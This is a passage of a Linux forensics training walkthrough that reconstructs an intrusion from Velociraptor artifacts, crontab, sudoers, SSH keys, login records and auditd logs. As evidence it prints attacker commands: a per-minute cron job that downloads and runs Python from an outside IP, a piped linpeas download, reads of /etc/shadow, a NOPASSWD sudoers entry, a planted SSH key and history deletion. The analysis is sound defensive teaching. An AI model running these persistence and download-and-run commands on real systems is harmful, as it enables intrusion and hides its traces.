28645   bash    2023-10-15 18:48:25.000000      sudo mount -t ext4 /dev/sdb /media/USB -o uid=1000
28645   bash    2023-10-15 18:48:25.000000      ��H���
28645   bash    2023-10-15 18:48:25.000000      ls -la
28645   bash    2023-10-15 18:48:25.000000      sudo reboot
28645   bash    2023-10-15 18:48:25.000000      ls
28645   bash    2023-10-15 18:48:25.000000      df -h
28645   bash    2023-10-15 18:48:25.000000      cat /etc/passwd
28645   bash    2023-10-15 18:48:25.000000      ls -la
28645   bash    2023-10-15 18:48:25.000000       ls
28645   bash    2023-10-15 18:48:25.000000      cat flag.txt
28645   bash    2023-10-15 18:48:25.000000      pwd
28645   bash    2023-10-15 18:48:25.000000      rm flag.txt
28645   bash    2023-10-15 18:48:25.000000      sudo lsblk
28645   bash    2023-10-15 18:48:25.000000      /etc/bash_completion.d/apport_completion
28645   bash    2023-10-15 18:48:25.000000      sudo fdisk -l | less
28645   bash    2023-10-15 18:48:25.000000      rm -rf ~/.bash_history
28645   bash    2023-10-15 18:48:25.000000      cat /etc/shadow
28645   bash    2023-10-15 18:48:25.000000      sudo fdisk -l | less
28645   bash    2023-10-15 18:48:25.000000      sudo cat /etc/shadow
```

Interesting commands executed:

|**Command**|**Description**|
|---|---|
|`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| sh`|Linpeas bash script executed in memory. This script is used to find privilege escalation options|
|`find / -perm -u=s -type f 2>/dev/null`|Find command locates binaries having SUID permission that can be used for privilege escalation|
|`vim /etc/sudoers`|`vim` used to read/modify `/etc/sudoers`|
|`sudo bash`|`bash` executed with root privileges|
|`whoami`|`whoami` to get username|
|`cat /etc/passwd`|Get content of `/etc/passwd` (users) file (not used in this module)|
|`cat flag.txt`|Get content of `flag.txt` (not used in this module)|
|`rm flag.txt`|Delete `flag.txt`|
|`rm -rf ~/.bash_history`|Forcefully delete `.bash_history` file|
|`cat /etc/shadow`|Get content of `/etc/shadow` file that stores the hashed passwords|
|`sudo cat /etc/shadow`|The same command used with `sudo`|

Bash history content can also be found in `Linux.Sys.BashHistory.json` file:

```bash
linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/results/Linux.Sys.BashHistory.json

{"Line":"echo \"*/1 * * * * /usr/bin/run-one /usr/bin/python3 -c 'import requests, subprocess; loader=requests.get(\\\"http://18.117.8.128:8000/chattingloosened\\\"); subprocess.run(\\\"/usr/bin/python3\\\", input=loader.content)'\" | crontab -","OSPath":"/home/john/.bash_history"}
{"Line":"ps aux | grep -i python3","OSPath":"/home/john/.bash_history"}
{"Line":"exit","OSPath":"/home/john/.bash_history"}
{"Line":"rm -rf ~/.bash_history ","OSPath":"/home/user/.bash_history"}
{"Line":"history","OSPath":"/home/user/.bash_history"}
{"Line":" ls","OSPath":"/home/user/.bash_history"}
{"Line":"ls -la","OSPath":"/home/user/.bash_history"}
{"Line":"sudo reboot","OSPath":"/home/user/.bash_history"}
{"Line":"whoami","OSPath":"/home/user/.bash_history"}
{"Line":"ls ","OSPath":"/home/user/.bash_history"}
{"Line":"ls -la","OSPath":"/home/user/.bash_history"}
{"Line":"pwd","OSPath":"/home/user/.bash_history"}
{"Line":"cd ~","OSPath":"/home/user/.bash_history"}
{"Line":"ls -la","OSPath":"/home/user/.bash_history"}
{"Line":"cat flag.txt","OSPath":"/home/user/.bash_history"}
{"Line":"rm flag.txt","OSPath":"/home/user/.bash_history"}
{"Line":"cat /etc/passwd","OSPath":"/home/user/.bash_history"}
{"Line":"cat /etc/shadow","OSPath":"/home/user/.bash_history"}
{"Line":"sudo cat /etc/shadow","OSPath":"/home/user/.bash_history"}
{"Line":"cd /tmp","OSPath":"/home/user/.bash_history"}
{"Line":"curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh","OSPath":"/home/user/.bash_history"}
{"Line":"sudo bash","OSPath":"/home/user/.bash_history"}
<SNIP>
```

The commands that are particularly noteworthy and have not been reviewed yet, or those that can provide you with additional context:

|**Command**|**Description**|
|---|---|
|`echo \"*/1 * * * * /usr/bin/run-one /usr/bin/python3 -c 'import requests, subprocess; loader=requests.get(\\\"http://18.117.8.128:8000/chattingloosened\\\"); subprocess.run(\\\"/usr/bin/python3\\\", input=loader.content)'\" \| crontab -`|Crontab is created to be executed every minute. Interesting is that it was executed as john user: `"OSPath":"/home/john/.bash_history"`|
|`ps aux \| grep -i python3`|List python3 processes, also executed by `john` user|
|`sudo cat /etc/shadow`|Get content /etc/shadow executed by user "`user`"|
|`vim /etc/sudoers`|Read/modify /etc/sudoers by user "`user`"|
|`sudo bash`|Bash executed as sudo by user "`user`"|

#### Crontab

Since you've observed multiple instances of crontab usage, it's time to examine the crontab file:

```bash
linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/results/Linux.Sys.Crontab%2FCronTabs.json

{"Event":null,"User":"root","Minute":"17","Hour":"*","DayOfMonth":"*","Month":"*","DayOfWeek":"*","Command":"cd / \u0026\u0026 run-parts --report /etc/cron.hourly","Path":"/etc/crontab"}
{"Event":null,"User":"root","Minute":"25","Hour":"6","DayOfMonth":"*","Month":"*","DayOfWeek":"*","Command":"test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.daily )","Path":"/etc/crontab"}
{"Event":null,"User":"root","Minute":"47","Hour":"6","DayOfMonth":"*","Month":"*","DayOfWeek":"7","Command":"test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.weekly )","Path":"/etc/crontab"}
{"Event":null,"User":"root","Minute":"52","Hour":"6","DayOfMonth":"1","Month":"*","DayOfWeek":"*","Command":"test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.monthly )","Path":"/etc/crontab"}
{"Event":null,"User":"root","Minute":"30","Hour":"3","DayOfMonth":"*","Month":"*","DayOfWeek":"0","Command":"test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron","Path":"/etc/cron.d/e2scrub_all"}
{"Event":null,"User":"root","Minute":"10","Hour":"3","DayOfMonth":"*","Month":"*","DayOfWeek":"*","Command":"test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r","Path":"/etc/cron.d/e2scrub_all"}
{"Event":null,"User":"/usr/bin/run-one","Minute":"*/1","Hour":"*","DayOfMonth":"*","Month":"*","DayOfWeek":"*","Command":"/usr/bin/python3 -c 'import requests, subprocess; loader=requests.get(\"http://18.117.8.128:8000/chattingloosened\"); subprocess.run(\"/usr/bin/python3\", input=loader.content)'","Path":"/var/spool/cron/crontabs/root"}
{"Event":null,"User":"/usr/bin/run-one","Minute":"*/1","Hour":"*","DayOfMonth":"*","Month":"*","DayOfWeek":"*","Command":"/usr/bin/python3 -c 'import requests, subprocess; loader=requests.get(\"http://18.117.8.128:8000/chattingloosened\"); subprocess.run(\"/usr/bin/python3\", input=loader.content)'","Path":"/var/spool/cron/crontabs/root"}
```

Crontab file was modified at 18:35:44:

```bash
linuxforensics@ubuntu:~$ stat /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/spool/cron/crontabs

File: /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/spool/cron/crontabs
  Size: 0               Blocks: 0          IO Block: 4096   regular empty file
Device: 805h/2053d      Inode: 1054033     Links: 1
Access: (0664/-rw-rw-r--)  Uid: ( 1000/linuxforensics)   Gid: ( 1000/linuxforensics)
Access: 2023-10-15 18:35:44.000000000 +0000
Modify: 2023-10-15 18:35:44.000000000 +0000
Change: 2023-10-23 16:32:10.970221999 +0000
 Birth: 2023-10-23 16:32:10.970221999 +0000
```

### File Modifications

Examining file modifications is a critical step for uncovering evidence of unauthorized activity, data tempering, or system compromises. Linux filesystems maintain several key timestamps for each file, often referred to as `MACB times`:

- Modification Time (`mtime`): Records the last time the file's content was changed.
- Access Time (`atime`): Tracks when the file was last read or accessed.
- Change Time (`ctime`): Notes changes to the file's metadata, such as permissions or ownership.
- Birth Time (`btime`): Available on certain filesystems like ext4, indicating when the file was created.

These timestamps, stored in the inode structure, can reveal timelines of events during an investigation. However, there are certain techniques like `timestomping` out there that can make the entire investigation more difficult.

Timestomping is a pretty sneaky anti-forensic trick attackers use to mess with file timestamps, making it harder to piece together what happened during an incident. Basically, it's all about changing those MACB times to either hide tracks or plant false trails. This can throw off timeline analysis big time, like making a malicious file look like it was created way before the breach. So just keep in mind that there are some techniques that can mess with the obvious logic of events you see.

#### Last modified files review

Keeping this possible anti-forensic technique aside, look at the last modified files. Therefore, your next step involves identifying files that were modified during the attack. To achieve this, you can use the find comment:

```bash
linuxforensics@ubuntu:~$ find /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto -type f -newermt '2023-10-15 18:00:00'
```

The most interesting files modified during this time:

```
<SNIP>
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/lastlog
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/wtmp
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/kern.log
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/apt/history.log
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/apt/term.log
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/dpkg.log
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/auth.log
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/journal/894062f9af204645a289e8016977fe6c/user-1000.journal
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/journal/894062f9af204645a289e8016977fe6c/system.journal
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/audit/audit.log
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/audit/audit.log.1
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/lib/dpkg/status
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/spool/cron/crontabs
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/run/utmp
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/run/systemd/transient/snap.lxd.workaround.service
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/run/systemd/generator.late/apport.service
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/run/systemd/system/netplan-ovs-cleanup.service
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/home/john/.ssh/authorized_keys
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/home/user/.lesshst
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/etc/shadow
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/etc/passwd
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/etc/sudoers
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/proc/mounts
/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/proc/net/arp
<SNIP>
```

#### ARP File

```bash
linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/proc/net/arp

IP address       HW type     Flags       HW address            Mask     Device

192.168.152.2    0x1         0x2         00:50:56:e9:6a:6c     *        ens33

192.168.152.254  0x1         0x2         00:50:56:ec:68:15     *        ens33

192.168.152.180  0x1         0x2         00:0c:29:ca:6f:de     *        ens33
```

You can utilize this MAC address to determine that the local address attacker system was running a VM using VMWare when you visit the following page: https://hwaddress.com/oui-iab/00-0C-29/

#### `sudoers` File

You observed multiple times that the `/etc/sudoers` file was modified. Check it:

```bash
linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/etc/sudoers | grep -v "#" | sed '/^\s*$/d'

user ALL=(ALL:ALL) NOPASSWD: ALL
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root    ALL=(ALL:ALL) ALL
%admin ALL=(ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
@includedir /etc/sudoers.d
```

Here you can see that the line with `user ALL=(ALL:ALL) NOPASSWD: ALL` was added to allow execution using `user` without the need of typing a password.

Using `stat` command, you can check when the `/etc/sudoers` file was modified:

```bash
linuxforensics@ubuntu:~$ stat /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/etc/sudoers

  File: /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/etc/sudoers
  Size: 1708            Blocks: 8          IO Block: 4096   regular file
Device: 805h/2053d      Inode: 1054393     Links: 1
Access: (0664/-rw-rw-r--)  Uid: ( 1000/linuxforensics)   Gid: ( 1000/linuxforensics)
Access: 2025-11-03 16:37:14.135871393 +0000
Modify: 2023-10-15 18:20:50.000000000 +0000
Change: 2023-10-23 16:32:13.522161661 +0000
 Birth: 2023-10-23 16:32:13.522161661 +0000
```

Modification time: `18:20:50`

However, making modifications to the sudoers file is restricted to users with sudo privileges. How did the user modify this file? You have previously observed commands that checked SUID binary attributes and opened the `/etc/suoders` file using the `vim` command.

Velociraptor has collected SUID binary attributes. You can validate your hypothesis by examining the `Linux.Sys.SUID.json` file.

```bash
linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/results/Linux.Sys.SUID.json | grep "vim"

{"Mode":"urwxr-xr-x","OSPath":"/usr/bin/vim.basic","Size":3783696,"Mtime":"2023-08-18T04:12:26Z","OwnerID":null,"GroupID":null}
```

The string `urwxr-xr-x` does not clearly indicate the presence of the SUID attribute on a file. The mode `urwxr-xr-x` means that the owner has full read, write, and execute permissions, while the group and others have read and execute permissions but no write permissions. Additionally, the `.viminfo` file hasn't been found for user `user`.

#### History of installed packages

Another file that has to be checked is `history.log`, which contains information about installed packages:

```bash
linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/apt/history.log
```

You can find that the `openssh-server` package was installed on the system.

```bash
Start-Date: 2023-10-15  18:27:27

Commandline: apt-get install openssh-server

Upgrade: openssh-client:amd64 (1:8.9p1-3ubuntu0.3, 1:8.9p1-3ubuntu0.4), openssh-server:amd64 (1:8.9p1-3ubuntu0.3, 1:8.9p1-3ubuntu0.4), openssh-sftp-server:amd64 (1:8.9p1-3ubuntu0.3, 1:8.9p1-3ubuntu0.4)

End-Date: 2023-10-15  18:27:30
```

#### SSH `authorized_keys` file

An authorized key in SSH is a public key used to facilitate login access for users, and this authentication mechanism is commonly known as public key authentication. Each user typically configures their authorized keys individually, often stored in a file named `.ssh/authorized_keys` located within the user's home directory. This setup allows users to authenticate securely with their public keys instead of relying on traditional password-based authentication.

You can see that SSH `authorized_keys` for `john` was modified.

```bash
linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/home/john/%2Essh/authorized_keys

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCSIqJ5Kws3ZH3cYkvfFYvDwLxE2QMUfxIouCSSzGd1BemSF/Ht0szYa5l1PxD45BpcHxMt2OTV4SZT9V44tAgyEsbkx+gJb0wj92ew/+cQejHPE/MRCI9TemwPKlskFkBEphwAYXMxxBNv/oi6F5b5j9EkC6OCD4AicX9n6JTuFG4Q0x0KNIpOgXIkqnYKtRvZy0JofDgdGqn2zSuqDDtpNil14qCb4po3hXFsZpNRnSSxKxw0XUj1S078t6hx6oYQDnSSTE6ObpC+W3Fq949+4NWgMXUB6nEU/p4609HDASv9wrCyh0AA8Xzmg7mHFqewZHe+GWKVM+c4H2KlifZvIznh921K/aTS1YfgJKET+0KrF5E/TQ5HK477EMsa6zifVeLRCopY6DDWr5IuHvBViDocn5Eizm5msYHy4VBdHueofyova2xTOwNHO+nFWZPae0qjVRSf2kzfRDQ1tiLy1sfZ6nGC6UyaNYLoOAiS9YaMIgP6FiuC8nR4D1v2uOk= leo@leo-virtual-machine
```

In the `Linux.Ssh.AuthorizedKeys.json` file:

```bash
linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/results/Linux.Ssh.AuthorizedKeys.json

{"Uid":"0","User":"john","OSPath":"/home/john/.ssh/authorized_keys","Key":"AAAAB3NzaC1yc2EAAAADAQABAAABgQCSIqJ5Kws3ZH3cYkvfFYvDwLxE2QMUfxIouCSSzGd1BemSF/Ht0szYa5l1PxD45BpcHxMt2OTV4SZT9V44tAgyEsbkx+gJb0wj92ew/+cQejHPE/MRCI9TemwPKlskFkBEphwAYXMxxBNv/oi6F5b5j9EkC6OCD4AicX9n6JTuFG4Q0x0KNIpOgXIkqnYKtRvZy0JofDgdGqn2zSuqDDtpNil14qCb4po3hXFsZpNRnSSxKxw0XUj1S078t6hx6oYQDnSSTE6ObpC+W3Fq949+4NWgMXUB6nEU/p4609HDASv9wrCyh0AA8Xzmg7mHFqewZHe+GWKVM+c4H2KlifZvIznh921K/aTS1YfgJKET+0KrF5E/TQ5HK477EMsa6zifVeLRCopY6DDWr5IuHvBViDocn5Eizm5msYHy4VBdHueofyova2xTOwNHO+nFWZPae0qjVRSf2kzfRDQ1tiLy1sfZ6nGC6UyaNYLoOAiS9YaMIgP6FiuC8nR4D1v2uOk=","Comment":"leo@leo-virtual-machine","Mtime":"2023-10-15T18:32:40Z"}
```

You can also check root's `.viminfo` file to see when the file was opened for modification:

```bash
/home/linuxforensics/Desktop/cases/scenario1/root_viminfo

# This viminfo file was generated by Vim 8.2.
# You may edit it if you're careful!
# Viminfo version
|1,4
# Value of 'encoding' when this file was written
- encoding=utf-8
# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:wq!
|2,0,1697394760,,"wq!"
# Search String History (newest to oldest):
# Expression History (newest to oldest):
# Input Line History (newest to oldest):
# Debug Line History (newest to oldest):
# Registers:
# File marks:
'0  3  0  /home/john/.ssh/authorized_keys
|4,48,3,0,1697394760,"/home/john/.ssh/authorized_keys"
# Jumplist (newest first):
- ' 3 0 /home/john/.ssh/authorized_keys
|4,39,3,0,1697394760,"/home/john/.ssh/authorized_keys"
- ' 1 0 /home/john/.ssh/authorized_keys
|4,39,1,0,1697394750,"/home/john/.ssh/authorized_keys"
# History of marks within files (newest to oldest):
> /home/john/.ssh/authorized_keys
*   1697394760  0
"   3   0
^   3   0
.   2   576
+   2   576
```

#### SSH login history

You can use `last` binary to read `wtmp` file:

```bash
linuxforensics@ubuntu:~$ last -f /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/wtmp

john     pts/0        192.168.152.180  Sun Oct 15 18:34 - 18:37  (00:03)
user     tty1                          Sun Oct 15 17:34    gone - no logout
reboot   system boot  5.15.0-86-generi Sun Oct 15 17:34   still running
user     tty1                          Sat Oct 14 19:33 - down   (22:00)
reboot   system boot  5.15.0-86-generi Sat Oct 14 19:33 - 17:34  (22:00)
user     tty1                          Thu Oct  5 20:46 - down  (8+22:46)
reboot   system boot  5.15.0-86-generi Thu Oct  5 20:43 - 19:33 (8+22:49)
user     tty1                          Wed Oct  4 22:16 - crash  (22:27)
reboot   system boot  5.15.0-86-generi Wed Oct  4 22:15 - 19:33 (9+21:18)

wtmp begins Wed Oct  4 22:15:12 2023
```

The same information is stored in the `Linux.Sys.LastUserLogin.json` file collected by Velociraptor:

```json
{"OSPath":"/var/log/wtmp","Type":"USER_PROCESS","ID":null,"PID":28322,"Host":"192.168.152.180","User":"john","IpAddr":"192.168.152.180","Terminal":"pts/0","login_time":"2023-10-15T18:34:01Z"}

{"OSPath":"/var/log/wtmp","Type":"DEAD_PROCESS","ID":null,"PID":28256,"Host":"","User":"","IpAddr":"0.0.0.0","Terminal":"pts/0","login_time":"2023-10-15T18:37:55Z"}
```

Given that SSH was installed on the system, you should proceed to examine the SSHD logs found in the `auth.log` file.

```bash
linuxforensics@ubuntu:~$ grep sshd /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/auth.log
```

Alternatively, review `Linux.Syslog.SSHLogin.json` file:

```json
{"Time":"0000-10-15T18:34:00Z","IP":"192.168.152.180","Result":"Accepted","Method":"publickey","AttemptedUser":"john","OSPath":"/var/log/auth.log"}
```

### Audit Log Review

Timelines allow you to reconstruct system events in chronological order. Creating timelines is crucial because it transforms raw, scattered data into a coherent narrative which allows you to understand what, when happened, and what was triggered by certain events. Besides that, a timeline is mandatory since it provides verifiable timestamps for accountability and aids rapid triage and holds up in court by establishing causality with UTC-aligned, tamper-evident data.

#### Zircolite

Previously, auditd was installed on the system, and you will now utilize it to address questions that were not covered in earlier investigations. To simplify your analysis, you can merge `audit.log.1` and `audit.log` into a single and use the Zircolite utility to analyze the audit log file.

```bash
linuxforensics@ubuntu:~$ cd tools/Zircolite
linuxforensics@ubuntu:~/tools/Zircolite$ cp /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/audit/audit.log.1 audit_full.log
linuxforensics@ubuntu:~/tools/Zircolite$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/audit/audit.log >> audit_full.log
```

Next run the Zircolite utility:

```bash
linuxforensics@ubuntu:~/tools/Zircolite$ python3 zircolite.py -A "2023-10-15T18:00:00" -B "2023-10-15T19:00:00" --events audit_full.log --auditd --ruleset rules/rules_linux.json --csv -o audit_logs_zircolite.csv

    ███████╗██╗██████╗  ██████╗ ██████╗ ██╗     ██╗████████╗███████╗
    ╚══███╔╝██║██╔══██╗██╔════╝██╔═══██╗██║     ██║╚══██╔══╝██╔════╝
      ███╔╝ ██║██████╔╝██║     ██║   ██║██║     ██║   ██║   █████╗
     ███╔╝  ██║██╔══██╗██║     ██║   ██║██║     ██║   ██║   ██╔══╝
    ███████╗██║██║  ██║╚██████╗╚██████╔╝███████╗██║   ██║   ███████╗
    ╚══════╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚══════╝
   -= Standalone SIGMA Detection tool for EVTX/Auditd/Sysmon Linux =-

[+] Checking prerequisites
[+] Extracting events Using 'tmp-6C3C5JHY' directory
100%|██████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  1.82it/s]
[+] Processing events
100%|██████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.60s/it]
[+] Creating model
[+] Inserting data
100%|███████████████████████████████████████████████████████████████████████████| 43638/43638 [00:01<00:00, 24754.19it/s]
[+] Cleaning unused objects
[+] Loading ruleset from : rules/rules_linux.json
[+] Executing ruleset - 168 rules
    - Systemd Service Creation [medium] : 2 events
    - Program Executions in Suspicious Folders [medium] : 52 events
    - Systemd Service Reload or Start [low] : 5 events
    - Suspicious C2 Activities [medium] : 110 events
    - Creation Of An User Account [medium] : 8 events
    - Use Of Hidden Paths Or Files [low] : 87 events
    - System Information Discovery - Auditd [low] : 32 events
    - Hidden Files and Directories [low] : 3 events
    - System Owner or User Discovery [low] : 2 events
    - System and Hardware Information Discovery [informational] : 3 events
100%|█████████████████████████████████████████████████████████████████████████████████| 168/168 [00:00<00:00, 305.00it/s]
[+] Results written in : audit_logs_zircolite.csv
[+] Cleaning

Finished in 4 seconds
```

What hasn't been noticed yet so far is user creation, so grep it:

```bash
linuxforensics@ubuntu:~/tools/Zircolite$ grep "Creation Of An User Account" audit_logs_zircolite.csv

Creation Of An User Account;Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.;medium;8;;39323;SYSCALL;2023-10-15 18:25:18;;;;;unset;27790;root;4294967295;unconfined;;offline;audit_full.log-M9JOXJGB.json;;;x86_64;execve;yes;0;561bc231fc00;561bc2320500;561bc231d9b0;8;2;27788;root;root;root;root;root;root;root;(none);useradd;/usr/sbin/useradd;user_modification;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Creation Of An User Account;Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.;medium;8;;39328;SYSCALL;2023-10-15 18:25:18;;;;;unset;27790;root;4294967295;unconfined;;offline;audit_full.log-M9JOXJGB.json;;;x86_64;openat;yes;5;ffffff9c;562870257f60;20902;0;1;27788;root;root;root;root;root;root;root;(none);useradd;/usr/sbin/useradd;etcpasswd;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
<SNIP>
```

Zircolite couldn't parse the created user. Then use the `aureport` and `ausearch` utilities to parse the audit log file.

```bash
linuxforensics@ubuntu:~/tools/Zircolite$ aureport -if audit_full.log

Summary Report
======================
Range of time in logs: 01/01/1970 00:00:00.000 - 10/15/2023 19:13:33.165
Selected time for report: 01/01/1970 00:00:00 - 10/15/2023 19:13:33.165

Number of changes in configuration: 1158
Number of changes to accounts, groups, or roles: 2
Number of logins: 3
Number of failed logins: 0
Number of authentications: 8
Number of failed authentications: 7
Number of users: 3
Number of terminals: 9
Number of host names: 30
Number of executables: 91
Number of commands: 159
Number of files: 484
Number of AVC's: 0
Number of MAC events: 0
Number of failed syscalls: 159
Number of anomaly events: 0
Number of responses to anomaly events: 0
Number of crypto events: 0
Number of integrity events: 0
Number of virt events: 0
Number of keys: 90
Number of process IDs: 6563
Number of events: 10627
```

The first question is:

- Can you answer how `/bin/bash` started at 18:48:25?

You can find PID 28644 started from PPID 916 (_apache_):

```bash
linuxforensics@ubuntu:~/tools/Zircolite$ sudo ausearch --syscall EXECVE -if audit_full.log -i --start 10/15/2023 '18:00:00' -te 10/15/2023 '18:50:00' | grep "18:48:25"

type=PROCTITLE msg=audit(10/15/2023 18:48:25.772:7398) : proctitle=/bin/bash
type=PATH msg=audit(10/15/2023 18:48:25.772:7398) : item=1 name=/lib64/ld-linux-x86-64.so.2 inode=262857 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=PATH msg=audit(10/15/2023 18:48:25.772:7398) : item=0 name=/bin/bash inode=262649 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=EXECVE msg=audit(10/15/2023 18:48:25.772:7398) : argc=1 a0=/bin/bash
type=SYSCALL msg=audit(10/15/2023 18:48:25.772:7398) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7fa7fe1c85b0 a1=0x7fa7fe1c90a8 a2=0x7fa7fe1c85f0 a3=0x7fa7fe3573f8 items=2 ppid=916 pid=28644 auid=unset uid=user gid=user euid=user suid=user fsuid=user egid=user sgid=user fsgid=user tty=(none) ses=unset comm=bash exe=/usr/bin/bash subj=unconfined key=susp_shell
type=PROCTITLE msg=audit(10/15/2023 18:48:25.776:7401) : proctitle=/bin/bash
type=PATH msg=audit(10/15/2023 18:48:25.776:7401) : item=1 name=/lib64/ld-linux-x86-64.so.2 inode=262857 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=PATH msg=audit(10/15/2023 18:48:25.776:7401) : item=0 name=/usr/bin/bash inode=262649 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=EXECVE msg=audit(10/15/2023 18:48:25.776:7401) : argc=2 a0=bash a1=-i
type=SYSCALL msg=audit(10/15/2023 18:48:25.776:7401) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5629b457f740 a1=0x5629b4580120 a2=0x5629b457bc90 a3=0x0 items=2 ppid=28644 pid=28645 auid=unset uid=user gid=user euid=user suid=user fsuid=user egid=user sgid=user fsgid=user tty=(none) ses=unset comm=bash exe=/usr/bin/bash subj=unconfined key=susp_shell
type=PROCTITLE msg=audit(10/15/2023 18:48:25.784:7402) : proctitle=/bin/sh /usr/bin/lesspipe
type=PATH msg=audit(10/15/2023 18:48:25.784:7402) : item=2 name=/lib64/ld-linux-x86-64.so.2 inode=262857 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=PATH msg=audit(10/15/2023 18:48:25.784:7402) : item=1 name=/bin/sh inode=262734 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=PATH msg=audit(10/15/2023 18:48:25.784:7402) : item=0 name=/usr/bin/lesspipe inode=262902 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=EXECVE msg=audit(10/15/2023 18:48:25.784:7402) : argc=2 a0=/bin/sh a1=/usr/bin/lesspipe
type=SYSCALL msg=audit(10/15/2023 18:48:25.784:7402) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x56458c6a5f60 a1=0x56458c6a6490 a2=0x56458c6a61b0 a3=0x8 items=3 ppid=28645 pid=28647 auid=unset uid=user gid=user euid=user suid=user fsuid=user egid=user sgid=user fsgid=user tty=(none) ses=unset comm=lesspipe exe=/usr/bin/dash subj=unconfined key=susp_shell
```

